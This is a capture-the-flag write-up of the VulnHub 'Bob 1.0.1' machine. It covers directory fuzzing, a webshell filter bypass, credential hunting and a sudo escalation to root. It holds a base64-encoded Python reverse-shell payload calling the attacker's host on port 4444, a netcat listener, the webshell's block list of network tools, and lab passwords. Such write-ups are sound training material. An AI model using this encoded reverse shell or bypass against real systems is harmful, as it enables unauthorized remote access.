# Recon
## NMAP
- tcp/80
- tcp/25468 - SSH
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Bob1.0.1]
└─# ffuf -u http://192.168.236.5/FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.txt,.php" -fw 22

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.236.5/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 22
________________________________________________

about.html              [Status: 200, Size: 2579, Words: 687, Lines: 91]
contact.html            [Status: 200, Size: 3145, Words: 1078, Lines: 149]
index.html              [Status: 200, Size: 1425, Words: 413, Lines: 70]
login.html              [Status: 200, Size: 1560, Words: 442, Lines: 74]
news.html               [Status: 200, Size: 4086, Words: 1168, Lines: 153]
passwords.html          [Status: 200, Size: 673, Words: 103, Lines: 31]
robots.txt              [Status: 200, Size: 111, Words: 6, Lines: 6]
:: Progress: [18460/18460] :: Job [1/1] :: 217 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- `passwords.html`
- `robots.txt`

# Initial Foothold
## TCP/80 - HTTP
1. View `robots.txt`
	```
	┌──(root💀kali)-[~/vulnHub/Bob1.0.1]
	└─# curl http://192.168.236.5/robots.txt
	User-agent: *
	Disallow: /login.php
	Disallow: /dev_shell.php
	Disallow: /lat_memo.html
	Disallow: /passwords.html
	```
2. Proceed to enumerated directories
	- `/login.php`
		``` html
		┌──(root💀kali)-[~/vulnHub/Bob1.0.1]
		└─# curl http://192.168.236.5/login.php
		<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
		<html><head>
		<title>404 Not Found</title>
		</head><body>
		<h1>Not Found</h1>
		<p>The requested URL /login.php was not found on this server.</p>
		<hr>
		<address>Apache/2.4.25 (Debian) Server at 192.168.236.5 Port 80</address>
		</body></html>
		```
	- `/dev_shell.php`
		![](images/Pasted%20image%2020220122153412.png)
	- `/lat_memo.html`
		![](images/Pasted%20image%2020220122153244.png)
		- "Webshell running on the server, ported over the filter from the old windows server"
	- `/passwords.html`
		![](images/Pasted%20image%2020220122153017.png)![](images/Pasted%20image%2020220122153103.png)
	- Proceed to `login.html`
		![](images/Pasted%20image%2020220122153724.png)
		- Disabled
3. Proceed to `/dev_shell.php`, figure out words that are filtered
	1. Start HTTP Server 
		![](images/Pasted%20image%2020220122154247.png)
	2. Download the files & analyze the source code
		```
		┌──(root💀kali)-[~/vulnHub/Bob1.0.1/192.168.236.5/loot]
		└─# wget 192.168.236.5:8181/dev_shell.php
		--2022-01-22 15:44:26--  http://192.168.236.5:8181/dev_shell.php
		Connecting to 192.168.236.5:8181... connected.
		HTTP request sent, awaiting response... 200 OK
		Length: 1396 (1.4K) [application/octet-stream]
		Saving to: ‘dev_shell.php’

		dev_shell.php                 100%[==============================================>]   1.36K  --.-KB/s    in 0s      

		2022-01-22 15:44:26 (229 MB/s) - ‘dev_shell.php’ saved [1396/1396]

		```
		![](images/Pasted%20image%2020220122154816.png)
		- Filtered 
			- `"pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc",";"`
4. Bypass filter by encoding payload
	1. Encode Payload
		![](images/Pasted%20image%2020220122155311.png)
	2. Final Payload
		```
		echo -n cHl0aG9uIC1jICdhPV9faW1wb3J0X187cz1hKCJzb2NrZXQiKS5zb2NrZXQ7bz1hKCJvcyIpLmR1cDI7cD1hKCJwdHkiKS5zcGF3bjtjPXMoKTtjLmNvbm5lY3QoKCIxOTIuMTY4LjIzNi40Iiw0NDQ0KSk7Zj1jLmZpbGVubztvKGYoKSwwKTtvKGYoKSwxKTtvKGYoKSwyKTtwKCIvYmluL3NoIikn | base64 -d | sh
		```
	3. Obtain www-data shell
		```
		┌──(root💀kali)-[~/vulnHub/Bob1.0.1/192.168.236.5/loot/http]
		└─# nc -nvlp 4444
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		Ncat: Connection from 192.168.236.5.
		Ncat: Connection from 192.168.236.5:57636.
		$ whoami
		whoami
		www-data
		```
		![](images/Pasted%20image%2020220122155513.png)
# Privilege Escalation
## Elliot - Via Creds Found
1. Look for `.txt` & `pass` files in `/home`
	```
	www-data@Milburg-High:/home$ find $(pwd) 2>/dev/null | grep -P ".txt|pass"
	/home/bob/.old_passwordfile.html
	/home/bob/Documents/staff.txt
	/home/bob/Documents/login.txt.gpg
	....
	/home/elliot/theadminisdumb.txt
	```
2. View enumerated files
	-  `.old_passwordfile.html`
		```
		www-data@Milburg-High:/$ more /home/bob/.old_passwordfile.html
		<html>
		<p>
		jc:Qwerty
		seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
		</p>
		</html>
		```
		- seb:`T1tanium_Pa$$word_Hack3rs_Fear_M3`
		- jc:Qwerty
	-  `/home/bob/Documents/staff.txt`
		```
		www-data@Milburg-High:/home$ cat /home/bob/Documents/staff.txt
		Seb:

		Seems to like Elliot
		Wants to do well at his job
		Gave me a backdoored FTP to instal that apparently Elliot gave him

		James:

		Does nothing
		Pretty Lazy
		Doesn't give a shit about his job

		Elliot:

		Keeps to himself
		Always needs to challenge everything I do
		Keep an eye on him
		Try and get him fired
		```
	-  `/home/bob/Documents/login.txt.gpg`
		```
		www-data:/$ more /home/bob/Documents/login.txt.gpg
		o��J[V0w�q�OS�bob@Milburg-High:/$ file /home/bob/Documents/login.txt.gpg
		/home/bob/Documents/login.txt.gpg: GPG symmetrically encrypted data (AES cipher)
		bob@Milburg-High:/$ 
		```
		- **symmetrically encrypted**, no need for private key, only passphrase needed.
	-  `/home/elliot/theadminisdumb.txt`
		```
		www-data@Milburg-High:/home$ cat /home/elliot/theadminisdumb.txt
		The admin is dumb,.........SNIP
		theadminisdumb
		```
		- elliot:theadminisdumb
3. Switch to seb, jc, elliot, could not enumerate/find ways to root
4. Proceed to `/home/bob/Documents`
	```
	jc@Milburg-High:~/Documents$ ls -la
	total 20
	drwxr-xr-x  3 bob bob 4096 Mar  5  2018 .
	drwxr-xr-x 18 bob bob 4096 Mar  8  2018 ..
	-rw-r--r--  1 bob bob   91 Mar  5  2018 login.txt.gpg
	drwxr-xr-x  3 bob bob 4096 Mar  5  2018 Secret
	-rw-r--r--  1 bob bob  300 Mar  4  2018 staff.txt
	```
5. Look for suspicious files
	```
	jc@Milburg-High:~/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ sh notes.sh 
	-= Notes =-
	Harry Potter is my faviorite
	Are you the real me?
	Right, I'm ordering pizza this is going nowhere
	People just don't get me
	Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>
	Cucumber
	Rest now your eyes are sleepy
	Are you gonna stop reading this yet?
	Time to fix the server
	Everyone is annoying
	Sticky notes gotta buy em
	bob@Milburg-High:~/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ 
	```
	![](images/Pasted%20image%2020220122173543.png)
	- HARPOCRATES
6. Decrypt `login.txt.gpg`
	```
	jc@Milburg-High:/tmp$ gpg --decrypt /home/bob/Documents/login.txt.gpg
	gpg: AES encrypted data
	gpg: problem with the agent: Permission denied <-- ERROR
	gpg: encrypted with 1 passphrase
	gpg: decryption failed: No secret key
	bob@Milburg-High:/tmp$ gpg --decrypt /home/bob/Documents/login.txt.gpg^C
	
	jc@Milburg-High:/tmp$ gpg --decrypt --pinentry-mode=loopback /home/bob/Documents/login.txt.gpg
	gpg: AES encrypted data
	gpg: encrypted with 1 passphrase
	bob:b0bcat_
	bob@Milburg-High:/tmp$ ls
	```
	```
	# OR
	jc@Milburg-High:/tmp$ gpg --batch --passphrase HARPOCRATES -d /home/bob/Documents/login.txt.gpg
	gpg: AES encrypted data
	gpg: encrypted with 1 passphrase
	bob:b0bcat_
	```
	![](images/Pasted%20image%2020220122174811.png)
	- bob:b0bcat_
	- Fix the error: https://askubuntu.com/questions/1080204/gpg-problem-with-the-agent-permission-denied
7. Switch to bob w/ bob:b0bcat_
	![](images/Pasted%20image%2020220122174910.png)
	

## Root - Via Sudo
1. Check sudo access
	```
	bob@Milburg-High:/tmp$ sudo -l
	sudo: unable to resolve host Milburg-High: Connection refused
	[sudo] password for bob: 
	Matching Defaults entries for bob on Milburg-High:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User bob may run the following commands on Milburg-High:
		(ALL : ALL) ALL
	bob@Milburg-High:/tmp$ 
	```
2. Obtain root shell
	![](images/Pasted%20image%2020220122175031.png)
3. Flag
	```
	root@Milburg-High:/# cat flag.txt
	CONGRATS ON GAINING ROOT

			.-.
		   (   )
			|~|       _.--._
			|~|~:'--~'      |
			| | :   #root   |
			| | :     _.--._|
			|~|~`'--~'
			| |
			| |
			| |
			| |
			| |
			| |
			| |
			| |
			| |
	   _____|_|_________ Thanks for playing ~c0rruptedb1t

	```
	![](images/Pasted%20image%2020220122175132.png)


--- 
Tags: #exploit/command-injection #bash-bypass #tcp/80-http/rce #linux-priv-esc/linux-creds-found 

---